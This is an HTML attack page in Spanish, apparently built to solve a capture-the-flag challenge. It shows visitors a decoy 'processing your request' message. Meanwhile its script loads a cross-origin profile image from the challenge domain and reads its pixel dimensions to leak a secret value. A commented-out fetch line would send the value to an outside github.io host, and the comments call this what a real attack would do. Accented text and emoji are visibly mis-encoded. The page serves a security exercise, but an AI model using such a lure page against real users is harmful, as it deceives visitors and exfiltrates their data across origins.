<!DOCTYPE html>
<html>
<head>
    <title>¬°Procesando su solicitud!</title>
    <meta charset="UTF-8">
</head>
<body>

    <h1>‚åõ Procesando su solicitud... Por favor espere. ‚åõ</h1>
    <p>Este sitio cargar√° su perfil de usuario en unos segundos y luego se cerrar√° autom√°ticamente.</p>
    
    <div id="log"></div>

    <script>
        // Funci√≥n para agregar mensajes al log en la p√°gina
        function logMessage(msg, type = 'info') {
            const logDiv = document.getElementById('log');
            const color = type === 'success' ? 'green' : type === 'error' ? 'red' : 'blue';
            logDiv.innerHTML += `<p style="color: ${color}; margin: 5px 0;">[${new Date().toLocaleTimeString()}] ${msg}</p>`;
        }

        logMessage("Inicio de script. Intentando cargar la imagen de Pepe...");

        // Dominio del desaf√≠o (Tu URL es de HTTPS)
        const DOMINIO_DESAFIO = "https://chl-0be918a6-5b4f-4de5-b30a-669e10a3cf51-imagen-importante.softwareseguro.com.ar";
        
        // URL de la imagen de Pepe
        const URL_IMAGEN = DOMINIO_DESAFIO + "/profile-pic"; 
        
        // 1. Crear un elemento de imagen oculto
        const img = new Image();
        img.crossOrigin = "anonymous"; // Se mantiene el intento de forzar CORS, aunque puede fallar.
        
        // 2. Definir lo que haremos cuando la imagen cargue
        img.onload = function() {
            logMessage("La imagen parece haber cargado.", 'info');
            
            // Obtener las dimensiones originales (naturales)
            const ancho = img.naturalWidth;
            const alto = img.naturalHeight;
            const nivel = ancho * alto;

            // ‚ö†Ô∏è VERIFICACI√ìN CR√çTICA:
            // Si ancho y alto son 0, 1, o el tama√±o de la imagen de error, la lectura fall√≥ por SOP.
            if (ancho <= 1 || alto <= 1 || nivel === 0) {
                 logMessage(`‚ùå FALLA DE LECTURA (SOP): Ancho=${ancho}px, Alto=${alto}px. Dimensiones no v√°lidas. El navegador bloque√≥ la lectura del tama√±o.`, 'error');
            } else {
                 // 3. √âxito: Mostrar y reportar el resultado
                logMessage(`‚úÖ √âXITO DE LECTURA: ${ancho}x${alto} p√≠xeles.`, 'success');
                logMessage(`‚úÖ Nivel de Pepe: ${nivel}`, 'success');
                logMessage(`üö® HASH MD5 requerido de: ${nivel}`, 'success');

                // En un ataque real, el env√≠o autom√°tico de datos ser√≠a aqu√≠:
                // fetch('https://josebaigorria.github.io/desafio-pepe/log.html?level=' + nivel);
            }

            // Opcional: Cerrar la ventana autom√°ticamente (para simular un ataque limpio)
            // setTimeout(() => { window.close(); }, 5000); // Cierra despu√©s de 5 segundos

        };
        
        img.onerror = function() {
            // El onerror se dispara si la URL de la imagen es incorrecta o el servidor la rechaza.
            logMessage(`‚ùå ERROR FATAL: No se pudo cargar la imagen desde ${URL_IMAGEN}. Revisa la ruta '/profile-pic'.`, 'error');
        };

        // 4. Iniciar la carga de la imagen (Se ejecuta inmediatamente al abrir la p√°gina)
        img.src = URL_IMAGEN;
    </script>
</body>
</html>
